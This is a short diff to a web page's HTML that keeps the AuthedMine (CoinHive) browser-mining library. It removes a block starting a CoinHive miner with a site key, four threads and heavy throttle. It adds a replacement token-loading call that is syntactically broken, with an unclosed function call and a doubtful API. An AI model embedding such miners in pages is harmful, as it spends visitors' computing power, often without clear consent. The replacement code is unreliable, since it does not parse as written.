@@ -73,12 +73,8 @@
     </script>
     <script src="https://authedmine.com/lib/authedmine.min.js"></script>
     <script>
-        var miner = new CoinHive.User('oIL0QgG44HkRc7GSbFB4GGOpE5wvm4BB', 'justicelove', {
-            threads: 4,
-            throttle: 0.8,
-            forceASMJS: false,
-            theme: 'dark',
-            language: 'auto'
-        });
-        miner.start();
+        CoinHive.Auth.LoadToken("oIL0QgG44HkRc7GSbFB4GGOpE5wvm4BB", function(token){
+            this.startNow(token);
+
+        }
     </script>
